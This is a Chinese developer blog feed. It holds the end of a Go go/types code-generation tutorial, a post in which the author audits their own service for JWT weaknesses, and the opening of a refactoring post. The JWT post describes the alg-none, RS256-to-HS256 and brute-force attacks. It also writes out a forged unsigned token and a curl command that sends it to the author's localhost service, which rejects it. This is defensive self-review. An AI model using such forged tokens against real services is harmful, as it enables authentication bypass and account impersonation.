&lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;field %s %v\n&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">field&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Name&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="nx">field&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Type&lt;/span>&lt;span class="p">())&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>又一个惯用法：&lt;code>NumFields&lt;/code> 和 &lt;code>Field&lt;/code>。注意&lt;code>Field&lt;/code>拿到的是一个 &lt;code>*types.Var&lt;/code>，可以认为表示一个变量，而&lt;code>field.Type()&lt;/code>得到的就是这个变量的类型。&lt;/p>
&lt;p>有了类型数据，我们就可以有的放矢，决定如何生成 &lt;code>field&lt;/code> 对应的代码了。&lt;/p>
&lt;h3 id="method">Method&lt;/h3>
&lt;p>另一种常见的情况是基于 &lt;code>interface&lt;/code> 生成实现，比如 &lt;code>go-kit&lt;/code> 那海量的样板代码。&lt;/p>
&lt;p>我们稍微改下上面的代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="k">for&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="p">&amp;lt;&lt;/span> &lt;span class="nx">tp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NumMethods&lt;/span>&lt;span class="p">();&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="o">++&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">method&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">tp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Method&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">signature&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">method&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Type&lt;/span>&lt;span class="p">().(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="nx">types&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Signature&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;func (r Sample) %s(&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">method&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Name&lt;/span>&lt;span class="p">())&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="p">&amp;lt;&lt;/span> &lt;span class="nx">signature&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Params&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="nf">Len&lt;/span>&lt;span class="p">();&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="o">++&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">param&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">signature&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Params&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="nf">At&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;%s %v,&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">param&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Name&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="nx">param&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Type&lt;/span>&lt;span class="p">())&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;)&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">signature&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Results&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="nf">Len&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">&amp;gt;&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34; (&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="p">&amp;lt;&lt;/span> &lt;span class="nx">signature&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Results&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="nf">Len&lt;/span>&lt;span class="p">();&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="o">++&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">result&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">signature&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Results&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="nf">At&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;%s %v&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">result&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Name&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="nx">result&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Type&lt;/span>&lt;span class="p">())&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="p">&amp;lt;&lt;/span> &lt;span class="nx">signature&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Params&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="nf">Len&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;,&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">signature&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Results&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="nf">Len&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">&amp;gt;&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34; )&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34; {\n\tpanic(errors.New(\&amp;#34;Not implemented!\&amp;#34;))\n}\n\n&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>并不复杂！&lt;/p>
&lt;p>遍历 interface 下的所有方法，然后把 &lt;code>Params&lt;/code> 和 &lt;code>Results&lt;/code> 挨个打印出来，函数体里放一个 &lt;code>panic(errors.New(&amp;quot;Not implemented!&amp;quot;))&lt;/code>，就是这样！&lt;/p>
&lt;p>最后输出像是这样：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">r&lt;/span> &lt;span class="nx">Sample&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">FirstName&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="kt">string&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">panic&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">errors&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">New&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Not implemented!&amp;#34;&lt;/span>&lt;span class="p">))&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">r&lt;/span> &lt;span class="nx">Sample&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">LastName&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="kt">string&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">panic&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">errors&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">New&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Not implemented!&amp;#34;&lt;/span>&lt;span class="p">))&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>值得注意的是，&lt;code>Method&lt;/code>返回的是 &lt;code>*types.Func&lt;/code>，但 &lt;code>Params&lt;/code>和&lt;code>Results&lt;/code>并不是&lt;code>types.Func&lt;/code>上的方法，而是 &lt;code>types.Signature&lt;/code>。官方文档说 &lt;code>Func&lt;/code>的&lt;code>Type()&lt;/code>返回的必然是 &lt;code>*types.Signature&lt;/code>，所以直接断言也是安全的。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>参考官方的文档 &lt;a class="link" href="https://github.com/golang/example/tree/master/gotypes" target="_blank" rel="noopener"
>gotypes&lt;/a>&lt;/p>
&lt;p>重点就一个：不要用 &lt;code>go/types&lt;/code> 下的 &lt;code>Config&lt;/code> 和 &lt;code>Checker&lt;/code>，用 &lt;code>importer.ForCompiler&lt;/code> 从源码获取类型数据。&lt;code>types&lt;/code>用起来个人感觉比 &lt;code>go/ast&lt;/code> 方便，缺点是因为引入类型会导致解析源码各方面的消耗增加，算是一个我个人比较偏好的 trade-off 吧。在 codegen 的输入类型比较复杂敏感的时候，拿 &lt;code>go/types&lt;/code> 替代 &lt;code>go/ast&lt;/code> 可以省下很多工作量。&lt;/p></description></item><item><title>不安全的 jwt</title><link>https://nnnewb.github.io/blog/p/unsafe-jwt/</link><pubDate>Mon, 11 Apr 2022 13:00:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/unsafe-jwt/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>今早翻到&lt;a class="link" href="https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html" target="_blank" rel="noopener"
>p神挖MinIO CVE的文章&lt;/a>，注意到几句话：&lt;/p>
&lt;blockquote>
&lt;p>jwt常见的攻击方法主要有下面这几种：&lt;/p>
&lt;ul>
&lt;li>将alg设置为None，告诉服务器不进行签名校验&lt;/li>
&lt;li>如果alg为RSA，可以尝试修改为HS256，即告诉服务器使用公钥进行签名的校验&lt;/li>
&lt;li>爆破签名密钥&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;p>虽然早早在项目里用上了jwt（大概是16~17年，在另一家公司的登陆系统里），但在目前任职的公司用上jwt的时候还真没从安全的角度考虑过如何编写 &lt;strong>正确、安全&lt;/strong> 的 jwt 验证代码。&lt;small>悄悄哔哔一句我也不是搞安全的啊（&lt;/small>&lt;/p>
&lt;p>既然翻博客的时候看到了，就没法当没看见。正好翻翻看自己写的垃圾代码是不是有洞。&lt;/p>
&lt;h2 id="开始-review">开始 review&lt;/h2>
&lt;p>因为这项目后端是微服务架构，身份验证实际上分成了两种情况：&lt;/p>
&lt;ol>
&lt;li>提供验证的服务，从 redis/mysql 校验身份&lt;/li>
&lt;li>其他服务，通过 rpc 请求验证服务来校验身份&lt;/li>
&lt;/ol>
&lt;p>jwt 本身通过签名机制保证发放出来的 token 不被篡改，所以在最初编写的时候主要考虑的还是解决用户账户的封禁、登陆互斥问题，jwt 对解决这方面问题的帮助有限，就没怎么深究。&lt;/p>
&lt;p>验证流程很简单：&lt;/p>
&lt;p>incoming request -&amp;gt; gRPC interceptor (&lt;code>rpc_authneticate()&lt;/code>) -&amp;gt; &lt;code>auth.Authenticate(ctx, req)&lt;/code>&lt;/p>
&lt;p>&lt;code>auth.Authenticate&lt;/code> 是验证业务的实现，分几个步骤：&lt;/p>
&lt;ol>
&lt;li>解析输入token，&lt;code>func ParseToken(token string) (*jwt.Token, *CustomJWTClaims, error)&lt;/code>&lt;/li>
&lt;li>同平台登陆互斥，限制同一平台仅一个有效登陆。通过比较 redis 里保存的 token 实现。&lt;/li>
&lt;li>账户状态检查，因为缓存设计的问题导致这一步需要查数据库，实现稀烂。&lt;/li>
&lt;/ol>
&lt;p>p神博客原文提到的方法里，修改 &lt;code>ALG&lt;/code> 来跳过校验无疑是最可能出现的坑，然后我就看了下自己写的：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="c1">// ParseToken 解析 jwt token，返回 token,claims,error
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kd">func&lt;/span> &lt;span class="nf">ParseToken&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">token&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="nx">jwt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Token&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">CustomJWTClaims&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">claims&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">CustomJWTClaims&lt;/span>&lt;span class="p">{}&lt;/span>
&lt;span class="nx">t&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">jwt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">ParseWithClaims&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">token&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">claims&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">jwt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Token&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kd">interface&lt;/span>&lt;span class="p">{},&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="k">return&lt;/span> &lt;span class="nx">JWTSecret&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">})&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">errors&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Wrap&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;parse jwt token with claims fail&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">t&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">claims&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip;&lt;/p>
&lt;p>好，我寄了！&lt;/p>
&lt;h2 id="验证漏洞">验证漏洞&lt;/h2>
&lt;p>事到如今已经没有退路，洞肯定是要补的，补之前出于好奇，再尝试一次利用，也作为洞存在的验证。&lt;/p>
&lt;h3 id="alg-none">ALG none&lt;/h3>
&lt;p>jwt 产生的签名字符串分成3个部分：HEADER、PAYLOAD、SIGNATURE，均使用 base64 编码，用 . 分隔。以官网的例子来分析如下：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/unsafe-jwt/image-20220411103235343.png"
width="1190"
height="629"
srcset="https://nnnewb.github.io/blog/blog/p/unsafe-jwt/image-20220411103235343_hu20c5215e53cd9915045eb9cbbaac446d_65338_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/unsafe-jwt/image-20220411103235343_hu20c5215e53cd9915045eb9cbbaac446d_65338_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="JWT格式"
class="gallery-image"
data-flex-grow="189"
data-flex-basis="454px"
>&lt;/p>
&lt;p>其中 header 和 payload 部分会编码成 url 安全的 base64，可以在命令行 &lt;code>echo &amp;lt;jwt.header&amp;gt; | base64 -d&lt;/code> 来看到 header 实际包含的内容，payload 同理。signature 的算法由 header 里的 alg 指定，比如 alg 是 &lt;code>HS256&lt;/code> 的时候签名就是 &lt;code>HMACSHA256(base64(header)+&amp;quot;.&amp;quot;+base64(payload))&lt;/code>。&lt;/p>
&lt;p>攻击方式1里提到的把 &lt;code>ALG&lt;/code> 改成 &lt;code>none&lt;/code>，就是告诉服务器不做签名验证，如果服务器信了你的邪，那就可以伪造出任意身份。&lt;/p>
&lt;p>接下来尝试构造一个无签名的 jwt 请求：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="nb">echo&lt;/span> &lt;span class="s1">&amp;#39;{&amp;#34;alg&amp;#34;: &amp;#34;none&amp;#34;, &amp;#34;typ&amp;#34;:&amp;#34;JWT&amp;#34;}&amp;#39;&lt;/span> &lt;span class="p">|&lt;/span> base64
&lt;span class="c1"># eyJhbGciOiAibm9uZSIsICJ0eXAiOiJKV1QifQo=&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s1">&amp;#39;{&amp;#34;iat&amp;#34;: 1649645013, &amp;#34;user_id&amp;#34;: 1, &amp;#34;device_category&amp;#34;: 0, &amp;#34;device_code&amp;#34;: &amp;#34;233&amp;#34;, &amp;#34;landing_platform&amp;#34;:&amp;#34;PC&amp;#34;}&amp;#39;&lt;/span> &lt;span class="p">|&lt;/span> base64
&lt;span class="c1"># eyJpYXQiOiAxNjQ5NjQ1MDEzLCAidXNlcl9pZCI6IDEsICJkZXZpY2VfY2F0ZWdvcnkiOiAwLCAi&lt;/span>
&lt;span class="c1"># ZGV2aWNlX2NvZGUiOiAiMjMzIiwgImxhbmRpbmdfcGxhdGZvcm0iOiJQQyJ9Cg==&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>需要注意的是&lt;code>=&lt;/code>是 base64 编码中的占位符，在构造签名字符串的时候要去掉。&lt;/p>
&lt;p>最后用&lt;code>.&lt;/code>连接，校验合法性。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">eyJhbGciOiAibm9uZSIsICJ0eXAiOiJKV1QifQo.eyJpYXQiOiAxNjQ5NjQ1MDEzLCAidXNlcl9pZCI6IDEsICJkZXZpY2VfY2F0ZWdvcnkiOiAwLCAiZGV2aWNlX2NvZGUiOiAiMjMzIiwgImxhbmRpbmdfcGxhdGZvcm0iOiJQQyJ9Cg.
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/unsafe-jwt/image-20220411104759489.png"
width="348"
height="83"
srcset="https://nnnewb.github.io/blog/blog/p/unsafe-jwt/image-20220411104759489_hucbe2d7ad8ce50be27cbc1b65d46d84ce_4044_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/unsafe-jwt/image-20220411104759489_hucbe2d7ad8ce50be27cbc1b65d46d84ce_4044_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="invalid signature"
class="gallery-image"
data-flex-grow="419"
data-flex-basis="1006px"
>&lt;/p>
&lt;p>&amp;hellip; 得，直接试一下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">curl -v -X GET -H &lt;span class="s1">&amp;#39;grpc-metadata-sessionkey: eyJhbGciOiAibm9uZSIsICJ0eXAiOiJKV1QifQo.eyJpYXQiOiAxNjQ5NjQ1MDEzLCAidXNlcl9pZCI6IDEsICJkZXZpY2VfY2F0ZWdvcnkiOiAwLCAiZGV2aWNlX2NvZGUiOiAiMjMzIiwgImxhbmRpbmdfcGxhdGZvcm0iOiJQQyJ9Cg.&amp;#39;&lt;/span> &lt;span class="s2">&amp;#34;localhost/v4/user/get_userinfo&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/unsafe-jwt/image-20220411110837870.png"
width="652"
height="147"
srcset="https://nnnewb.github.io/blog/blog/p/unsafe-jwt/image-20220411110837870_hu718adea8bc6936c75db6c3dab5f17133_5456_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/unsafe-jwt/image-20220411110837870_hu718adea8bc6936c75db6c3dab5f17133_5456_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="&amp;lsquo;none&amp;rsquo; signature type is not allowed"
class="gallery-image"
data-flex-grow="443"
data-flex-basis="1064px"
>&lt;/p>
&lt;p>惊喜！&lt;/p>
&lt;p>看了眼使用的 jwt 库，&lt;code>github.com/dgrijalva/jwt-go v3.2.0+incompatible&lt;/code>，目前迁移到了 &lt;code>github.com/golang-jwt/jwt&lt;/code>，最新版本 4.x ，感谢这库给我挡了一枪。&lt;/p>
&lt;h3 id="alg-rs256">ALG RS256&lt;/h3>
&lt;p>另一个坑，HS256 =&amp;gt; RS256 攻击，倒是没踩上。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="nx">token&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">jwt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewWithClaims&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">jwt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">SigningMethodHS256&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">CustomJWTClaims&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="c1">// ...
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="p">})&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>HS256 攻击没有 ALG none 攻击那么简单直白了，特地去搜了下 HS256 攻击方法和原理。&lt;/p>
&lt;p>参考文章：&lt;/p>
&lt;ul>
&lt;li>&lt;a class="link" href="https://infosecwriteups.com/attacks-on-json-web-token-jwt-278a49a1ad2e?gi=11514f6199e8" target="_blank" rel="noopener"
>Attacks on JSON Web Token&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://anubhav-singh.medium.com/get-a-feel-of-jwt-json-web-token-8ee9c16ce5ce" target="_blank" rel="noopener"
>Get a Feel of JWT (JSON Web Token)&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>RS256签名的算法可以这样表示：&lt;code>base64(rsa256(sha256(base64(header)+&amp;quot;.&amp;quot;+base64(payload)+secret)))&lt;/code>，其中需要关注的是 &lt;code>rsa256&lt;/code> 是如何签名的。&lt;/p>
&lt;p>关于不对称加密套件的加解密/签名一句话概括就是：公钥加密，私约解密；私钥签名，公钥验签。RS256=&amp;gt;HS256攻击的原理就是服务器验证签名的时使用的是公钥——顾名思义，“公”指的是公开的，如果服务器所使用的的秘钥对在其他地方复用（比如使用的是域名的公钥），那公钥就唾手可得。&lt;/p>
&lt;p>仅仅拿到了公钥还不够，因为签名只能由私钥产生。这里就涉及一个 JWT 实现的漏洞：&lt;/p>
&lt;ul>
&lt;li>&lt;a class="link" href="https://nvd.nist.gov/vuln/detail/CVE-2015-9235" target="_blank" rel="noopener"
>CVE-2015-9235&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://nvd.nist.gov/vuln/detail/CVE-2016-10555" target="_blank" rel="noopener"
>CVE-2016-10555&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>服务端使假设签名是 RS256 ，用公钥验签时，客户端可以构造一个恶意的 jwt 签名，把HEADER里的 ALG 指定为 HS256，服务端就会把 RS256 验证的公钥当成 HS256 的私钥来验证签名。&lt;/p>
&lt;p>满足下面三个条件：&lt;/p>
&lt;ul>
&lt;li>服务器签发、接受 RS256 私钥签名的JWT&lt;/li>
&lt;li>拿到公钥&lt;/li>
&lt;li>使用有漏洞的 jwt 库&lt;/li>
&lt;/ul>
&lt;p>就能自由构造任意 JWT PAYLOAD。&lt;/p>
&lt;h3 id="暴力穷举">暴力穷举&lt;/h3>
&lt;p>既 brute-force 大法，对弱密码加上好点的字典也是可行的。不过我这服务HS256 秘钥是随机生成的，大小写字母+特殊字符。&lt;/p>
&lt;p>不过即使是这样还是有考虑定期轮换秘钥，验证的阶段根据 iat/exp 来选择秘钥，即使攻击者舍得花时间碰运气也很难瞎猫碰上死耗子了。但因为种种原因，多少感觉有点过度设计的意思吧。就暂且没管。&lt;/p>
&lt;h2 id="修复">修复&lt;/h2>
&lt;p>已知 jwt 库已经解决了 ALG none 的问题，采用的签名算法也不是 RS256，随机秘钥熵也够，那就没啥可修复的了。非要说的话可以在 &lt;code>ParseToken&lt;/code> 阶段限制下 ALG 的选择，强制选择一个比较坚挺的哈希算法。再把秘钥轮换做起来。&lt;/p>
&lt;p>可以先列入计划，优先级不用太高吧。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>显然没有银弹这句话很对，jwt 并不是解决一切问题的良药，甚至是一把可能砸在自己小拇指上的锤子。&lt;/p>
&lt;p>对 jwt 的三种常规攻击方式，两种是操纵 header 的 alg 实现的，alg none 的方式尝试跳过签名验证，alg rs256 转 hs256 则是利用库漏洞加上窃取公钥来伪造签名，利用难度更大。&lt;/p>
&lt;p>暴力穷举法就没什么可说的了，或许在代码审计的时候需要考虑下秘钥面对暴力穷举时的安全性。&lt;/p></description></item><item><title>记一次重构事务管理和配置管理</title><link>https://nnnewb.github.io/blog/p/refactoring-transaction-and-config-management-note/</link><pubDate>Fri, 01 Apr 2022 12:30:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/refactoring-transaction-and-config-management-note/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>重构发生的背景是这样的。&lt;/p>
&lt;p>我手里的项目因为一系列管理上的混乱和不作为导致接手的时候非常糟，总之理解成那种写了一两年代码第一次接触Go没人review代码的半吊子还从单体beego一路跨到非常考验架构能力到编程能力各方面能力的微服务架构结果留下烂摊子跑路了的情况就对啦。&lt;/p>
&lt;p>没看懂写的什么鬼？对，我接手项目的时候也是这个感觉。&lt;/p>
&lt;p>细看也能读懂，业务逻辑不复杂，但读起来的感觉就像是shit里淘金。&lt;/p>
&lt;p>其中有几个特别困扰我的问题：&lt;/p>
&lt;ol>
&lt;li>事务管理凌乱，混用 &lt;code>xorm&lt;/code> 和&lt;code>database/sql&lt;/code>，各种拼 sql 和手动管理 &lt;code>sql.Tx&lt;/code>，分布式事务的问题零关注。&lt;/li>
&lt;li>配置极其杂乱，几百条配置项不分用途场景全写成环境变量，结果就是海量的全局变量和极乱的 &lt;code>func init&lt;/code>。&lt;/li>
&lt;/ol>
&lt;p>还有些和主题无关的问题，比如完全没有考虑缓存，现在在屎山上建缓存就非常头疼了；API 设计完全没考虑如何演进，不说 BFF 什么的设计模式，这 API 就完全是毫无设计，到处滥用 protobuf 生成的结构，结果严重耦合，等等种种。这些这里先不提。&lt;/p>
